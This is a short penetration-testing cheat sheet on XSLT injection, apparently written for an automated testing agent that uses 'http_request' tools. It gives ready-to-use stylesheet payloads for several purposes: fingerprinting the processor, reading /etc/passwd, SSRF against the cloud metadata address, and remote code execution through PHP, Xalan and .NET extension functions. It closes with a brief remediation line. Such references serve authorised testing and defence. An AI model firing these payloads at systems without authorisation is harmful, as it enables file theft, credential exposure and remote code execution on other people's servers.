# XSLT injection

When the server transforms XML with an attacker-controlled stylesheet (or lets you
supply the XSL), you get file read, SSRF, and often RCE via extension functions.
Look for "export to PDF/HTML", "apply template", report generators, or a param that
is clearly a stylesheet.

## Fingerprint the processor first
```
<xsl:value-of select="system-property('xsl:version')"/>     1.0 vs 2.0/3.0
<xsl:value-of select="system-property('xsl:vendor')"/>      Xalan/Saxon/libxslt/.NET
```
The vendor decides which RCE bridge exists.

## File read / SSRF
```
<xsl:value-of select="unparsed-text('/etc/passwd')"/>                XSLT 2.0
<xsl:copy-of select="document('file:///etc/passwd')"/>               1.0 (XML-wellformed files)
<xsl:copy-of select="document('http://169.254.169.254/latest/meta-data/')"/>   SSRF
```

## RCE via extension functions (vendor-specific)
```
PHP (libxslt, registerPHPFunctions enabled):
  xmlns:php="http://php.net/xsl"
  <xsl:value-of select="php:function('system','id')"/>
Java (Xalan):
  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
  … invoke Runtime.exec('id') through the java: bridge
.NET (msxsl):
  <msxsl:script implementation-prefix="user"> … C# … </msxsl:script>
```
Fire only a benign command (`id`, `whoami`) as proof — `uid=` in the output.

Send the stylesheet with `http_request` in whatever field carries it; read the
result from `http_flow_body`. Evidence: reflected file content / `uid=`.
Remediation: don't accept user stylesheets; disable extension functions and
external `document()`/`unparsed-text()` access.
